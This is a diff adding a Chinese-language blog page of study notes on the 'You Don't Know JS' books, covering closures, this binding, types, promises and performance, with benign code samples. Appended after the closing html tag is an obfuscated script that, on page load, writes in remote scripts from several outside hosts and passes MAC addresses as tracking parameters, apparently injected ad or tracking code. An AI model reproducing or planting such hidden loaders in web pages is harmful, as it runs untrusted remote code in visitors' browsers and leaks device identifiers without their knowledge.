@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>《你不知道的JS上、中》——总结</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="http://www.newhuan.info/css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="http://www.newhuan.info/blog" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">《你不知道的JS上、中》——总结</h1>
+                <h3 class="date">20170813</h3>
+                <div class="clearfix typo">
+                    <h3>作用域和闭包</h3>
+                    <p>
+                        ReferenceError：引用错误：变量右查询时，发现此变量undeclared(未声明)；
+                        TypeError：对此变量的操作是不合法的，如a()。a is not a function;
+                    </p>
+                    <p>
+                        闭包：当一个函数能够记住并访问其被定义时的作用域时，就产生了闭包。
+                        wiki：闭包：一个引用了自由变量的funtion；
+                    </p>
+                    <p>
+                        函数运行时进行作用域查找时，是从函数定义的位置开始查找，而不是函数被调用的位置开始查找，参考闭包的概念1.
+                    </p>
+                    <pre>
+                    <code>
+    var a = 3;
+	function test() {
+		console.log(a)
+    }
+    function test2() {
+	    let a = 1;
+	    return test();//3
+    }
+	test2();//3
+                    </code>
+                    </pre>
+
+                    <p>
+                        单例模式：立即执行匿名函数，使用闭包返回一个对象。
+                    </p>
+
+                    <h3>
+                        this&object
+                    </h3>
+                    <p>
+                        JavaScript 环境中内置的 setTimeout() 函数实现和下面的伪代码类似：
+                    </p>
+                    <pre>
+                        <code>
+function setTimeout(fn,delay) {
+// 等待 delay 毫秒
+        fn(); // <-- 调用位置！
+ }
+                        </code>
+                    </pre>
+                    <p>
+                        如果一个对象自己定义了一个get和set属性，那么在获取和设置此对象值的时候就会调用这个对象自定义的set和get方法；如非必要，不要把属性的名字设置成一些约定俗成的关键字。
+                    </p>
+                    <p>
+                        Object.defineProperty,设置对象属性的enumerable可以设置此属性会不会出现在对象的属性列表中。
+
+                    </p>
+                    <p>
+                        for..of调用的是[Symbol.iterator]这个属性名的方法，一般用于遍历生成器function*生成的迭代器对象；
+                    </p>
+                    <p>
+                        JSON安全对象的深拷贝可以使用 <code>JSON.parse(JSON.stringify(obj))</code>
+                    </p>
+
+                    <pre>
+                        <code>
+    class Widget {
+        constructor(width,height) {
+            this.width = width || 50;
+            this.height = height || 50;
+            this.$elem = null;
+        }
+        render($where){
+            if (this.$elem) {
+                this.$elem.css( {
+                    width: this.width + "px",
+                    height: this.height + "px"
+                } ).appendTo( $where );
+            }
+        }
+    }
+    class Button extends Widget {
+        constructor(width,height,label) {
+            super( width, height );
+            this.label = label || "Default";
+            this.$elem = $( "<" + "button>" ).text( this.label );
+        }
+        render($where) {
+            super.render($where);
+            this.$elem.click( this.onClick.bind( this ) );
+        }
+        onClick(evt) {
+            console.log( "Button '" + this.label + "' clicked!" );
+        }
+    }
+    $( document ).ready( function(){
+        var $body = $( document.body );
+        var btn1 = new Button( 125, 30, "Hello" );
+        var btn2 = new Button( 150, 40, "World" );
+        btn1.render( $body );
+        btn2.render( $body );
+    } );
+                        </code>
+                    </pre>
+                    <p>
+                        如果已经使用bing,call,apply方法改变了一个function的this指针指向，那么对这个已经被修改的function再次使用这三个方法，将不会把this指针再次改变；但是可以使用new方法修改，new会舍弃原this指向重新指定。
+                    </p>
+
+                    <h3>type&syntax</h3>
+                    <p>
+                        创建一个带id的元素时，会同时创建一个此id同名的全局变量，值就是这个元素HTMLElement
+                    </p>
+                    <p>
+                        Object.keys(..) 并不包含来自于 [[Prototype]] 链的属性，for..in则包含。
+                    </p>
+                    <p>
+                        void 运算符返回 undefined 。
+                    </p>
+                    <p>
+                        能够被“安全”呈现的最大整数是 2^53 - 1 ，即 9007199254740991 ，在 ES6 中被定义为Number.MAX_SAFE_INTEGER 。最小整数是 -9007199254740991 ，在 ES6 中被定义为 Number.MIN_SAFE_INTEGER 。
+                    </p>
+                    <p>
+                        有些数字操作（如数位操作）只适用于 32 位数字，所以这些操作中数字的安全范围就要小很多，变成从 Math.pow(-2,31) （ -2147483648 ，约 － 21 亿）到 Math.pow(2,31) - 1 （ 2147483647 ，约 21 亿）。<code>a | 0 </code>可以将变量 a 中的数值转换为 32 位有符号整数，
+                    </p>
+                    <p>
+                        ES6 中新加入了一个工具方法 Object.is(..) 来判断两个值是否绝对相等，可以用来处理特殊情况：NaN 和 +0，-0
+                    </p>
+                    <p>
+                        尽量不要使用复杂的运算符按优先级结合的表达式，如果不得不写，使用括号提高可读性
+                    </p>
+                    <p>
+                        尽量不要使用 arguments ，如果非用不可，也切勿同时使用 arguments和其对应的命名参数。
+                    </p>
+                    <p>
+                        switch中的case使用 === 匹配
+                    </p>
+                    <pre>
+                        <code>
+var a = "hello world";
+var b = 10;
+    switch (true) {
+        case (a || b == 10)://和true做 === 匹配
+            //永远执行不到这里
+            break;
+        default:
+            console.log( "Oops" );
+    }
+                        </code>
+                    </pre>
+
+
+                    <h3>async&quality</h3>
+                    <p>
+                        <code>Promise.resolve()</code>接收一个Promise对象作为参数的时候，会直接返回这个Promise对象,
+                        如果接受的是一个thenable对象，则会递归展开并返回一个立即值的Promise。
+                        <code>Promise.resolve(thenable)</code>保证了返回的一定是一个promise，提供了一种可信任的机制
+                    </p>
+                    <p>
+                        使用async、await同时使用编译工具将其改为generator，比写generator好用的多。
+                    </p>
+                    <p>
+                        内存分配、垃圾收集和作用域访问这三个是对JavaScript性能影响最大的因素
+                    </p>
+                    <p>
+                        numberify中parseInt最快,数字和字符串相等比较中<code>x + "" === y + "";</code>最快。
+                    </p>
+
+                    <p>
+                        非关键路劲上，纠结于细微的性能提升都是过早优化，重要的是程序关键路径上的性能优化，但性能并不是唯一要考虑的因素。在性能方面大体相似的几个选择中，可读性应该是另外一个重要的考量因素。但是，更好的优化（比如性能提高数倍及以上）一定是整体的优化，Amdahl定律。
+                    </p>
+                    <p>
+                        优先考虑保证可读性的基础上完成功能的实现，一些比较简单的优化手法，写的时候就用上，但是不用太纠结于这些。真的需要做性能优化的时候，把主要精力放在关键路劲的优化上。同时要牢记，编程语言首先是给人读的，其次才是给机器运行的。最后，如果真的需要把整个程序的性能提升一个大的级数，牢记Amdahl定律。
+                    </p>
+                    <p>
+                        Benchmark.js 库是一个很棒的js测试库，jsPerf.com 是一个使用Benchmark.js 库同时配合统计学得出一个统计学上可信结论的网站，测试同一功能不同实现的性能差别的时候是一个很好的地方。
+                    </p>
+                    <p>
+                        函数尾调用：return 后的表达式是一个单独的函数调用。尾调用优化可以使尾部的函数调用使用当前函数正在使用的栈帧而不是重新创建一个新的栈帧。一般用于解决递归算法被js引擎限制调用栈深度的问题。（过深的创建的栈帧数量太大，造成标签引用的内存过多引起崩溃）。
+                    </p>
+                    <p>
+                        Web Worker 、SIMD、asm.js => 三种提高js性能的方式
+                    </p>
+                    <blockquote>
+                        <p>Web Worker: 适用于把长时间的或资源密集型的任务卸载到不同的线程中，以提高主 UI 线程的响应性</p>
+                        <p>SIMD 打算把 CPU 级的并行数学运算映射到 JavaScript API，以获得高性能的数据并行运算，比如在大数据集上的数字处理</p>
+                        <p>asm.js 描述了 JavaScript 的一个很小的子集，它避免了 JavaScript 难以优化的部分（比如垃圾收集和强制类型转换），并且让 JavaScript 引擎识别并通过激进的优化运行这样的代码</p>
+                    </blockquote>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.info/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+                <!--<a href="https://github.com/SolidZORO/vodka" target="_blank">vodka</a>-->
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
